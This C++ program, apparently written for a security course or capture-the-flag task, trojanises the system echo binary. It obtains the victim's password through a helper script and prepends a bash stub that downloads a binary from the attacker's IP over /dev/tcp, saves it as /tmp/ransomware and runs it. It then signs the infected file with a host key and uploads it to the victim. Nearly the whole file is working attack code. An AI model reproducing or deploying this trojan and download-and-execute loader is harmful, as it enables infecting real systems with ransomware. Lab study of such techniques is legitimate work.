#include <iostream>
#include <fstream>
#include <vector>
#include <zlib.h>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <openssl/evp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sstream>

using namespace std;

#define SIGNATURE_SIZE 512

// 呼叫 Python 腳本來獲取密碼
string getPasswordFromTask1(const string &victimIP)
{
    string command = "python3 task1.py " + victimIP;
    cout << "[+] Running command: " << command << endl;
    FILE *pipe = popen(command.c_str(), "r");
    if (!pipe)
    {
        throw runtime_error("Failed to run task1.py.");
    }

    char buffer[128];
    string result = "";
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr)
    {
        result += buffer;
    }
    pclose(pipe);

    // 從輸出中提取密碼
    size_t pos = result.find("成功登入！密碼是：");
    if (pos != string::npos)
    {
        string password = result.substr(pos + strlen("成功登入！密碼是："));
        password.erase(password.find_last_not_of("\n\r") + 1); // 移除結尾的換行符
        return password;
    }
    else
    {
        throw runtime_error("Failed to retrieve password from task1.py output.");
    }
}

// 壓縮檔案
vector<unsigned char> compressFile(const string &filePath)
{
    string tmpGzPath = "/tmp/tmp_compressed.gz";

    gzFile out = gzopen(tmpGzPath.c_str(), "wb");
    if (!out)
    {
        throw runtime_error("Failed to open gzip file.");
    }

    ifstream input(filePath, ios::binary);
    if (!input)
    {
        gzclose(out);
        throw runtime_error("Failed to open original file.");
    }

    vector<char> buffer(4096);
    while (input.read(buffer.data(), buffer.size()))
    {
        gzwrite(out, buffer.data(), input.gcount());
    }
    // 最後一段
    gzwrite(out, buffer.data(), input.gcount());
    gzclose(out);
    input.close();

    // 讀回 gzip binary
    ifstream gzFile(tmpGzPath, ios::binary);
    return vector<unsigned char>((istreambuf_iterator<char>(gzFile)),
                                 istreambuf_iterator<char>());
}

vector<unsigned char> gzipCompressFile(const string &filePath)
{
    ifstream inputFile(filePath, ios::binary);
    if (!inputFile)
        throw runtime_error("Failed to open file.");

    vector<unsigned char> inputData((istreambuf_iterator<char>(inputFile)),
                                    istreambuf_iterator<char>());
    inputFile.close();

    // gzip header 需要額外空間
    uLongf compressedSize = compressBound(inputData.size()) + 18; // gzip header/footer
    vector<unsigned char> compressedData(compressedSize);

    z_stream stream;
    memset(&stream, 0, sizeof(stream));
    if (deflateInit2(&stream, Z_DEFAULT_COMPRESSION, Z_DEFLATED,
                     15 + 16, // <<<<<< GZIP 格式（windowBits = 15 + 16）
                     8, Z_DEFAULT_STRATEGY) != Z_OK)
    {
        throw runtime_error("deflateInit2 for gzip failed.");
    }

    stream.next_in = inputData.data();
    stream.avail_in = inputData.size();
    stream.next_out = compressedData.data();
    stream.avail_out = compressedSize;

    if (deflate(&stream, Z_FINISH) != Z_STREAM_END)
    {
        deflateEnd(&stream);
        throw runtime_error("deflate for gzip failed.");
    }

    compressedData.resize(stream.total_out);
    deflateEnd(&stream);
    return compressedData;
}

// 生成數位簽章
vector<unsigned char> generateSignature(const vector<unsigned char> &data)
{
    vector<unsigned char> signature(SIGNATURE_SIZE, 0);

    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx)
    {
        throw runtime_error("Failed to create EVP_MD_CTX.");
    }

    // 假設已經初始化 Dilithium3，這裡僅為範例
    // EVP_DigestSignInit(mdctx, ...);

    EVP_MD_CTX_free(mdctx);
    return signature;
}

void ensureKeysExist()
{
    // 檢查私鑰是否存在
    ifstream privateKeyFile("dilithium3-private.pem");
    if (!privateKeyFile)
    {
        cout << "[+] Private key not found. Generating Dilithium3 key pair..." << endl;

        // 生成私鑰
        int result = system("openssl genpkey -provider oqsprovider -algorithm dilithium3 -out dilithium3-private.pem");
        if (result != 0)
        {
            throw runtime_error("Failed to generate Dilithium3 private key.");
        }

        // 生成公鑰
        result = system("openssl pkey -provider oqsprovider -in dilithium3-private.pem -pubout -out dilithium3-public.pem");
        if (result != 0)
        {
            throw runtime_error("Failed to generate Dilithium3 public key.");
        }

        cout << "[+] Dilithium3 key pair generated successfully." << endl;
    }
    else
    {
        cout << "[+] Private key found. Skipping key generation." << endl;
    }
    privateKeyFile.close();
}

void embedPayload(const string &originalFilePath, const string &infectedFilePath, const string &attackerIP, int attackerPort)
{
    // ensureKeysExist();

    // 1. 取得原始檔案大小
    ifstream originalFile(originalFilePath, ios::binary | ios::ate);
    if (!originalFile)
        throw runtime_error("Failed to open original file.");
    size_t originalSize = originalFile.tellg();
    originalFile.close();

    // 2. 壓縮原始檔案
    auto compressedData = compressFile(originalFilePath);

    // 3. 構造 stub loader（Bash）
    string stubLoader = R"(#!/bin/bash
# 執行病毒載荷
exec 3<>/dev/tcp/)" + attackerIP +
                        "/" + to_string(attackerPort) + R"(
cat <&3 > /tmp/ransomware
chmod +x /tmp/ransomware
/tmp/ransomware

# 解壓原始 echo
tail -c +394 "$0" | gunzip 2>/dev/null > /tmp/original_echo
chmod +x /tmp/original_echo
/tmp/original_echo "$@"
rm -f /tmp/original_echo /tmp/ransomware
exec 0<&-  # 關閉 stdin
exec 1>&-  # 關閉 stdout
exec 2>&-  # 關閉 stderr
exit 0)";

    // 4. 構造 payload（與 stub 分離是為了可維護性）
    string payload = ""; // 如果 payload 只是上面 bash 的一部分可略

    // 5. 整合 stub + payload + 壓縮資料
    vector<unsigned char> content;
    content.insert(content.end(), stubLoader.begin(), stubLoader.end());
    content.insert(content.end(), payload.begin(), payload.end());
    content.insert(content.end(), compressedData.begin(), compressedData.end());
    // cout << "Stub size: " << stubLoader.size() << endl;
    // cout << "Payload size: " << payload.size() << endl;
    // cout << "Compressed data size: " << compressedData.size() << endl;

    // 6. 如果目前內容比原始小，補零（確保還原原始 echo 時 offset 合理）
    size_t paddingSize = 0;
    if (content.size() < originalSize - SIGNATURE_SIZE)
    {
        paddingSize = originalSize - SIGNATURE_SIZE - content.size();
        content.insert(content.end(), paddingSize, 0);
    }

    // 7. 寫入 /tmp/tmp_payload.bin 準備簽章
    string tmpPayloadPath = "/tmp/tmp_payload.bin";
    ofstream tmpPayloadFile(tmpPayloadPath, ios::binary);
    if (!tmpPayloadFile)
        throw runtime_error("Failed to write temporary payload.");
    tmpPayloadFile.write(reinterpret_cast<const char *>(content.data()), content.size());
    tmpPayloadFile.close();

    // 8. 執行 openssl 簽章
    string signaturePath = "/tmp/signature.bin";
    string opensslCommand = "openssl dgst -provider oqsprovider -provider default "
                            "-sign /app/certs/host.key "
                            "-binary -out " +
                            signaturePath + " " + tmpPayloadPath;
    int result = system(opensslCommand.c_str());
    if (result != 0)
        throw runtime_error("Failed to sign payload.");

    // 9. 讀取簽章的前 512 個位元組
    ifstream sigFile(signaturePath, ios::binary);
    if (!sigFile)
        throw runtime_error("Failed to read signature.");
    vector<unsigned char> signature((istreambuf_iterator<char>(sigFile)), istreambuf_iterator<char>());
    sigFile.close();

    // 確保簽章至少有 512 個位元組
    if (signature.size() < 512)
        throw runtime_error("Signature is too small. Expected at least 512 bytes.");

    // 只取前 512 個位元組
    vector<unsigned char> truncatedSignature(signature.begin(), signature.begin() + 512);

    // 10. 合併 content + signature，寫入最終檔案
    ofstream infectedFile(infectedFilePath, ios::binary);
    if (!infectedFile)
        throw runtime_error("Failed to create infected file.");
    infectedFile.write(reinterpret_cast<const char *>(content.data()), content.size());
    infectedFile.write(reinterpret_cast<const char *>(truncatedSignature.data()), truncatedSignature.size());
    // cout << "[+] Infected file size: " << signature.size() << endl;
    infectedFile.close();

    // 11. 設定可執行權限
    string chmodCommand = "chmod +x " + infectedFilePath;
    int chmodResult = system(chmodCommand.c_str());
    if (chmodResult != 0)
        throw runtime_error("Failed to chmod infected file.");
}

// 上傳感染檔案到受害者
void uploadToVictim(const string &victimIP, const string &username, const string &password, const string &infectedFilePath)
{
    string command = "python3 upload_file.py " + victimIP + " " + username + " " + password + " " + infectedFilePath;
    int result = system(command.c_str());
    if (result != 0)
    {
        throw runtime_error("Failed to upload file using upload_file.py.");
    }
}

void downloadFromVictim(const string &victimIP, const string &username, const string &password, const string &remoteFilePath, const string &localFilePath)
{
    string command = "python3 download_file.py " + victimIP + " " + username + " " + password + " " + remoteFilePath + " " + localFilePath;
    int result = system(command.c_str());
    if (result != 0)
    {
        throw runtime_error("Failed to download file using download_file.py.");
    }
}

// 主程式
int main(int argc, char *argv[])
{
    if (argc != 4)
    {
        cerr << "Usage: " << argv[0] << " <Victim IP> <Attacker IP> <Attacker port>" << endl;
        return 1;
    }

    string victimIP = argv[1];
    string attackerIP = argv[2];
    int attackerPort = stoi(argv[3]);

    try
    {
        // 呼叫 task1.py 獲取密碼
        cout << "[+] Retrieving password from task1.py..." << endl;
        string password = getPasswordFromTask1(victimIP);
        // string password = "csc2025"; // 假設這是從 task1.py 獲取的密碼
        cout << "[+] Retrieved password: " << password << endl;

        string originalEchoPath = "/usr/bin/echo";
        //string originalEchoPath = "/bin/echo";
        string infectedEchoPath = "/tmp/echo";

        // 從受害者提取 /app/echo
        // cout << "[+] Downloading /app/echo from victim..." << endl;
        // downloadFromVictim(victimIP, "csc2025", password, "/app/echo", "/tmp/echo");

        // 嵌入病毒載荷
        embedPayload(originalEchoPath, infectedEchoPath, attackerIP, attackerPort);

        // 上傳感染檔案到受害者
        uploadToVictim(victimIP, "csc2025", password, infectedEchoPath);

        cout << "[+] Infection completed successfully." << endl;
        // 清理臨時檔案
        /*
        cout << "[+] Cleaning up temporary files..." << endl;
        if (remove(originalEchoPath.c_str()) == 0)
        {
            cout << "[+] Deleted: " << originalEchoPath << endl;
        }
        else
        {
            cerr << "[-] Failed to delete: " << originalEchoPath << endl;
        }
        */
    }
    catch (const exception &e)
    {
        cerr << "[-] Error: " << e.what() << endl;
        return 1;
    }

    return 0;
}